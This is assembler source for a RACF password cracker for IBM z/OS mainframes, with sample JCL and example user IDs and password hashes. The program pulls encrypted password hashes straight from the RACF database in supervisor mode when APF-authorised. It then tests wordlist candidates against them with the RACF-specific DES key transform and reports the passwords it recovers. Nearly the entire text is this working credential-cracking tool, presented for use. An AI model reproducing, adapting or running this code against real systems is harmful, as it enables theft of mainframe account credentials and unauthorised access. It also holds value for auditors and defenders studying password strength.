* RACF PASSWORD CRACKER - THIERRY FALISSARD - WWW.OS390-MVS.FREESURF.FR
* ENHANCED VERSION - MAY 2007
* USER'S MACROS REQUIRED FOR ASSEMBLY: CONVERT
*
* SAMPLE JCL:
* //SYSIN:    LIST OF PASSWORDS TO TEST
* //SYSPRINT: OUTPUT
* //SYSUSER:  LIST OF USERIDS (8 BYTES) OPTIONALLY FOLLOWED
*              BY THE ENCRYPTED PASSWORD (16 HEX BYTES)
*
* EXAMPLE:
* //EXEC     EXEC PGM=RACRACKR
* //STEPLIB  DD   DISP=SHR,DSN=MY.LOADLIB
* //SYSPRINT DD   SYSOUT=*
* //SYSIN    DD   *
* SYS1            PASSWORD TO TEST (8 BYTES)
* P390            PASSWORD TO TEST (8 BYTES)
* TEST            PASSWORD TO TEST (8 BYTES)
* //SYSUSER  DD   *
* IBMUSER C585D307BD44E61F  :USERID + ENCRYPTED PASSWORD
* P390    3F6BE94720DD9B78  :USERID + ENCRYPTED PASSWORD
* S390                      :USERID, PASSWORD MISSING, GET IT FROM RACF
*                            (IN THIS CASE, LOADLIB MUST BE APF)
RACRACKR CSECT
         YREGS ,
* SET BASE REGISTER
         BAKR  R14,0
         LR    R12,R15               SET BASE REGISTER
         USING RACRACKR,R12
         B     START
         DC    C'RACRACKR-&SYSDATC-&SYSTIME'
START    DS    0H
* CPACF DES SUPPORT MUST BE INSTALLED, OTHERWISE STOP
         TM    X'A3',X'01'             Z/ARCH?        FLCARCH=PSAZARCH
         BNO   ERROR1                  NO, QUIT
         TM    X'CA',X'40'             CRYPTO ASSIST? FLCFACL2=FLCFCRYA
         BNO   ERROR1                  NO, QUIT
         XR    R0,R0                   R0 = 0 : KMC-QUERY
         LA    R1,CPACFPRM             128-BIT STATUS WORD
         XC    CPACFPRM,CPACFPRM       CLEAR STATUS AREA
         DC    X'B92F0024'             KMC R2,R4 (R2, R4 IGNORED)
         TM    CPACFPRM,X'40'          BIT 1 = SUPPORT OF DES ?
         BNO   ERROR1                  DES ALGO IS NOT SUPPORTED
* OPEN FILES
         OPEN  (SYSPRINT,(OUTPUT))
         OPEN  (SYSUSER,(INPUT))
* READ USER FROM INPUT FILE SYSUSER    ** USER LOOP **
LOOPUSR  GET   SYSUSER,USERZONE
         CLI   PWDHEX,C' '             IF HEX PASSWORD NOT SPECIFIED,
         BE    READRACF                THEN READ IT FROM RACF
* CONVERT PASSWORD FROM HEX TO BINARY
         MVC   PWDXTMP,PWDHEX          COPY HEX PASSWORD
         TR    PWDXTMP,HEXBINTB        CONVERT BIN->HEX  C'A6'->X'0A06'
         LA    R3,8                    8 BYTES
         LA    R4,PWDXTMP              START OF HEX PASSWORD (INPUT)
         LA    R5,PWDBIN               START OF BIN PASSWORD (OUTPUT)
         XR    R0,R0                   R0=0
         XR    R1,R1                   R1=0
LOOPHEX  IC    R0,0(R4)                LOADING OCTET             X'0A'
         SLL   R0,4                    SHIFTING 4 BITS LEFTWARDS X'A0'
         IC    R1,1(R4)                LOADING NEXT OCTET        X'06'
         AR    R0,R1                   ADDING PREVIOUS VALUE     X'A6'
         STC   R0,0(R5)                STORING OUTPUT BIN BYTE   X'A6'
         LA    R4,2(R4)                NEXT INPUT BYTE IN HEX PASSWORD
         LA    R5,1(R5)                NEXT OUTPUT BYTE IN BIN PASSWORD
         BCT   R3,LOOPHEX              NEXT HEX BYTE IN HEX PASSWORD
         B     STARTUP                 USE BINARY PASSWORD AND CONTINUE
* RETRIEVE ENCRYPTED PASSWORD IN CURRENT RACF DATABASE
READRACF DS    0H
         TESTAUTH FCTN=1                  TEST APF AUTH
         LTR   R15,R15
         BNZ   NOTAPF
         MODESET MODE=SUP,KEY=ZERO        GET INTO SUPERVISOR MODE
         RACXTRT TYPE=EXTRACT,ENTITY=USER,FIELDS=RACFFLD
         ST    R15,RC
         ST    R1,SAVEREG1
         L     R15,RC
         LTR   R15,R15
         BNZ   NOUSER
* DETERMINE ENCRYPTED PASSWORD FROM EXTRACTED DATA
         XR    R3,R3
         L     R1,SAVEREG1
         ICM   R3,B'0011',4(R1)            LOAD OFFSET TO PASSWORD
         AR    R1,R3
         MVC   PWDBIN,0(R1)                GET PASSWORD IN BINARY
         MODESET MODE=PROB,KEY=NZERO      GET BACK INTO PROBLEM MODE
* CONVERT BIN PASSWORD TO HEX (FOR DISPLAY)
         UNPK  PWDHEX(9),PWDBIN(5)         UNPACK 4B.  X'1D'->X'F1FD'
         NC    PWDHEX(8),=X'0F0F0F0F0F0F0F0F'  CLEAR X'F1FD'->X'010D'
         TR    PWDHEX(8),=C'0123456789ABCDEF'  CONVERT TO HEX
         UNPK  PWDHEX+8(9),PWDBIN+4(5)       UNPACK 4B.  X'1D'->X'F1FD'
         NC    PWDHEX+8(8),=X'0F0F0F0F0F0F0F0F'  CLEAR X'F1FD'->X'010D'
         TR    PWDHEX+8(8),=C'0123456789ABCDEF'  CONVERT TO HEX
STARTUP  DS    0H
* OPEN PASSWORD INPUT DATASET
         OPEN  (SYSIN,(INPUT))
* READ PASSWORD FROM INPUT FILE SYSIN   ** PASSWORD LOOP **
LOOP     DS    0H
         GET   SYSIN,ZONIN
* SET ZONE TO BE ENCRYPTED
         MVC   ENCZONE,USER             ZONE TO BE ENCRYPTED IS USERID
* GENERATE KEY
         MVC   KEY,ZONIN
         MVC   SAVEKEY,KEY
* RACF-COMPLIANT MODIFICATION OF THE KEY
         XC    KEY,=X'5555555555555555' INVERSING ODD BITS
         ICM   R0,15,KEY                LOADING THE KEY
         ICM   R1,15,KEY+4              LOADING THE KEY
         SLDL  R0,1                     SHIFTING THE KEY
         STCM  R0,15,KEY                STORING THE KEY
         STCM  R1,15,KEY+4              STORING THE KEY
* ENCRYPT USING CPACF DES ENCRYPTION
         LA    R0,1                     DES ENCRYPTION FUNCTION CODE
         LA    R1,CPACFPRM              CPACF PARAMETER (IV+KEY)
         LA    R1,KEY                   CPACF PARAMETER (IV+KEY)
         LA    R2,ENCZONE               INPUT ZONE
         LA    R4,ENCZONE               OUTPUT ZONE
         LA    R5,8                     LENGTH OF ZONE TO BE ENCRYPTED
LOOPCPA  DS    0H
         DC    X'B92E0024'              KM   R2,R4   ENCRYPT
         BO    LOOPCPA                  IF PARTIAL ENCRYPT, CONTINUE
* COMPARE WITH RACF ENCRYPTED PASSWORD
         CLC   ENCZONE,PWDBIN           COMPARE ENCRYPTED PASSWORD
         BE    FOUND                    MATCH, SO CLEAR VALUE GUESSED
         B     LOOP                     NO MATCH, TRY ANOTHER PASSWORD
* ALL PASSWORDS TRIED, NO MATCH
ADDFIN   CLOSE (SYSIN)
         MVC   MSG04USR,USER             SET FIELD IN OUTPUT MESSAGE
         MVC   MSG04PWD,PWDHEX           SET FIELD IN OUTPUT MESSAGE
         PUT   SYSPRINT,MSG04
         AP    CNTNOT,ONE
         B     LOOPUSR
* PASSWORD HAS BEEN DECRYPTED SUCCESSFULLY
FOUND    DS    0H
         CLOSE (SYSIN)
         MVC   MSG05USR,USER             SET FIELD IN OUTPUT MESSAGE
         MVC   MSG05PWD,PWDHEX           SET FIELD IN OUTPUT MESSAGE
         MVC   MSG05PW2,SAVEKEY          SET FIELD IN OUTPUT MESSAGE
         PUT   SYSPRINT,MSG05
         AP    CNTFND,ONE
         B     LOOPUSR                    PROCESS NEXT USER
NOUSER   DS    0H
         MODESET MODE=PROB,KEY=NZERO      GET BACK INTO PROBLEM MODE
* CONVERT RETURN CODE INTO DISPLAY CHARS
         UNPK  MSG06RC(9),RC(5)             UNPACK 4B.  X'1D'->X'F1FD'
         NC    MSG06RC(8),=X'0F0F0F0F0F0F0F0F'  CLEAR X'F1FD'->X'010D'
         TR    MSG06RC(8),=C'0123456789ABCDEF'  CONVERT TO HEX
         MVI   MSG06TMP,C' '                CLEAR AUXILIARY FIELD
         AP    CNTERR,ONE
         MVC   MSG06USR,USER
         PUT   SYSPRINT,MSG06             USER IS UNKNOWN
         B     LOOPUSR
NOTAPF   DS    0H
         MVC   MSG07USR,USER
         PUT   SYSPRINT,MSG07
         AP    CNTERR,ONE
         B     LOOPUSR
FINUSR   CLOSE (SYSUSER)
* PRINT FINAL STATISTICS: USERS CRACKED AND NOT CRACKED
         CONVERT  FROMP=CNTFND,TOZ=CTRFND
         CONVERT  FROMP=CNTNOT,TOZ=CTRNOT
         CONVERT  FROMP=CNTERR,TOZ=CTRERR
         PUT   SYSPRINT,MSG01        USERS CRACKED AND NOT CRACKED
* PRINT FINAL STATISTICS: USERS IN ERROR
         PUT   SYSPRINT,MSG02        USERS IN ERROR
* COMPUTE SUCCESS RATE=
         AP    CNTNOT,CNTFND           TOTAL USERS (CRACKED+NOT)
         CONVERT  FROMP=CNTNOT,TOB=WORKWORD   USERS TOTAL
         CONVERT  FROMP=CNTFND,TOB=RC         USERS FOUND
         L     R1,RC                   SUCCESS
         MH    R1,=H'100'
         L     R2,WORKWORD
         XR    R0,R0
         LTR   R2,R2
         BZ    CLOPRT
         DR    R0,R2                DIVIDE SUCCESSES*100 BY TOTAL USERS
         ST    R1,WORKWORD
         CONVERT  FROMB=WORKWORD,TOZ=CTRRATE    GET RATE
         PUT   SYSPRINT,MSG03
*
CLOPRT   CLOSE (SYSPRINT)
FIN      XR    R15,R15
         PR    ,
ERROR1   DS    0H
         WTO   'RACRACKR CPACF NOT SUPPORTED'
         LA    R15,8
         PR    ,
         LTORG
* MESSAGE
MSG01    DS    0CL133
         DC    C' STATISTICS: '
CTRFND   DS    CL10
         DC    C' CRACKED, '
CTRNOT   DS    CL10
         DC    C' NOT DECRYPTED'
         DC    CL(L'MSG01+MSG01-*)' '
* MESSAGE
MSG02    DS    0CL133
         DC    C' STATISTICS: '
CTRERR   DS    CL10
         DC    C' USERS IN ERROR'
         DC    CL(L'MSG02+MSG02-*)' '
* MESSAGE
MSG03    DS    0CL133
         DC    C' STATISTICS: SUCCESS RATE IS '
CTRRATE  DS    CL10
         DC    C' %'
         DC    CL(L'MSG03+MSG03-*)' '
* MESSAGE
MSG04    DS    0CL133
         DC    C' USER= '
MSG04USR DS    CL8
         DC    C' PASSWORD='
MSG04PWD DS    CL16
         DC    C' NOT DECRYPTED'
         DC    CL(L'MSG04+MSG04-*)' '
* MESSAGE
MSG05    DS    0CL133
         DC    C' USER= '
MSG05USR DS    CL8
         DC    C' PASSWORD='
MSG05PWD DS    CL16
         DC    C' / '
MSG05PW2 DS    CL8
         DC    CL(L'MSG05+MSG05-*)' '
* MESSAGE
MSG06    DS    0CL133
         DC    C' USER= '
MSG06USR DS    CL8
         DC    C' IS UNKNOWN, RACXTRT RC='
MSG06RC  DS    CL8
MSG06TMP DC    CL1' '     MUST FOLLOW MSG06RC
         DC    CL(L'MSG06+MSG06-*)' '
* MESSAGE
MSG07    DS    0CL133
         DC    C' USER= '
MSG07USR DS    CL8
         DC    C' PASSWORD=???????????????? **ERROR,'
         DC    C' PGM NOT APFAUTH- SPECIFY ENCRYPTED PASSWORD IN HEX'
         DC    CL(L'MSG07+MSG07-*)' '
*
         DS    0F
RACFFLD  DC    F'1',CL8'PASSWORD'      USER'S PASSWORD (ENCRYPTED FORM)
HEXBINTB DC    CL193' ',X'0A0B0C0D0E0F',CL41' '   HEX TO BIN CONVERSION
         DC    X'00010203040506070809',CL6' '     HEX TO BIN CONVERSION
CPACFPRM DS    0CL16
         DC    8X'00'                   INITIALIZATION VECTOR=BIN ZERO
KEY      DS    CL8                      ENCRYPTION KEY
SYSPRINT DCB   DDNAME=SYSPRINT,DSORG=PS,MACRF=PM,LRECL=133,RECFM=FB
SYSUSER  DCB   DDNAME=SYSUSER,DSORG=PS,EODAD=FINUSR,MACRF=GM
SYSIN    DCB   DDNAME=SYSIN,DSORG=PS,EODAD=ADDFIN,MACRF=GM
CNTFND   DC    PL4'0'                   FOUND COUNT
CNTNOT   DC    PL4'0'                   NOT FOUND COUNT
CNTERR   DC    PL4'0'                   IN ERROR COUNT
ONE      DC    PL4'1'                   ONE
PWDBIN   DS    CL8
SAVEREG1 DS    F
RC       DS    F
ENCZONE  DS    CL8
SAVEKEY  DC    CL8' '
PWDXTMP  DS    CL16
CPWORK   DS    CL16
ZONIN    DS    CL80             INPUT RECORD FROM SYSIN
USERZONE DS    0CL80            INPUT RECORD FROM SYSUSER
USER     DS    CL8
PWDHEX   DS    CL16
         DS    CL233            SOME SLACK
WORKWORD DC    F'1'
         END
